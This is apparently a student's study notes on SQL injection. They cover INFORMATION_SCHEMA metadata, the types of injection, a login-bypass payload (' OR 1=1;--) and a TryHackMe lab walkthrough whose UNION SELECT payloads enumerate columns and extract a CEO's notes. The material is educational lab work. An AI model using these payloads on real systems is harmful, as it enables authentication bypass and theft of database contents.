---
description: >-
  Structured-Query Language (SQL) injection attack. SQL is standard language for
  storing, manipulating and retrieving  data in databases.
---

# SQL injection

## Important notes in SQL

### 1. INFORMATION\_SCHEMA&#x20;

> INFORMATION\_SCHEMA provides access to database metadata, information about the MySQL server such as the name of a database or table, the data type of a column, or access privileges.

{% embed url="https://dev.mysql.com/doc/refman/8.4/en/information-schema-table-reference.html" %}

#### INFORMATION\_SCHEMA.TABLES

A particular metadata provided by INFORMATION\_SCHEMA would be `TABLES`. This provides information about all tables and views within a database.

The `TABLES` table has these columns:

1. `TABLE_CATALOG`

The name of the catalog to which the table belongs.&#x20;

2. `TABLE_SCHEMA`

The name of the schema (database) to which the table belongs.

3. `TABLE_NAME`

The name of the table.

4. `TABLE_TYPE`

`BASE TABLE` for a table, `VIEW` for a view, or `SYSTEM VIEW` for an `INFORMATION_SCHEMA` table.

#### INFORMATION\_SCHEMA.COLUMNS

Another metadata provided would be `COLUMNS`, which table provides information about columns in tables.&#x20;

The `COLUMNS` table has these columns (only shown a few):

1. `TABLE_CATALOG`

The name of the catalog to which the table containing the column belongs.&#x20;

2. `TABLE_SCHEMA`

The name of the schema (database) to which the table containing the column belongs.

3. `TABLE_NAME`

The name of the table containing the column.

4. `COLUMN_NAME`

The name of the column.



_Information about INFORMATION\_SCHEMA.TABLES retrieved from:_

{% embed url="https://dev.mysql.com/doc/refman/8.4/en/information-schema-tables-table.html" %}

_Information about INFORMATION\_SCHEMA.COLUMNS retrieved from:_

{% embed url="https://dev.mysql.com/doc/mysql-infoschema-excerpt/8.0/en/information-schema-columns-table.html" %}

## Types of SQL injection attacks

1. In-Band SQLi

> In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

2. Blind SQLi

> Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless.

Possible feedbacks that can help us in a blind SQLi attack:

a) Boolean response based

b) Time based

* Using the built-in `SLEEP()` method
* The `SLEEP()` method will only ever get executed upon a successful `UNION SELECT` statement.

3. Out-of-Band SQLi

> Out-of-band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.

### Example of Blind SQLi

Suppose there is a login form with input fields for username and password. The SQL query may something like this:&#x20;

`select * from users where username=<input> and password=<input> LIMIT 1;`

As long as this SQL statement resolves to a _true_ value, the login will succeed. Without proper validation, an attacker can maliciously inject SQL commands to force the query to be true without having a valid username/password pair.&#x20;

In this case, the input to the password field would look something like this:&#x20;

`' OR 1=1;--`

This input does the following:

* `'`: Escape from the password field
* `OR`: logical statement
* `1=1`: A statement that always resolves to a _true_ value
* `;`: Indicates the end of SQL query statement
* `--`: Comments out everything after



_**Knowledge taken from the following TryHackMe tutorial:**_

{% embed url="https://tryhackme.com/r/room/sqlinjectionlm" %}

## Practical challenge

_**TASK 8**_ from:&#x20;

{% embed url="https://tryhackme.com/r/room/burpsuiterepeater" %}

**Challenge Objective**

> Your objective in this challenge is to identify and exploit a Union SQL Injection vulnerability present in the ID parameter of the `/about/ID` endpoint. By leveraging this vulnerability, your task is to launch an attack to retrieve the notes about the CEO stored in the database.

1. `1'`

* To force an error:&#x20;

`Invalid statement:`&#x20;

`SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 1';`

The information provided in the error message tells us about the SQL query used

2. `8 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name='people'`

* The value _**`8`**_ (or any other values that does not match an entry in the database) is used to force the first part of the query to not return any results, so as to allow us to view the results from the subsequent `UNION` statement
* Displays all the columns in the `people` table

3. `8 UNION SELECT notes,null,null,null,null from people where id=1;`

* The ID of the CEO is `1`
* This query will retrieve the content stored in the notes

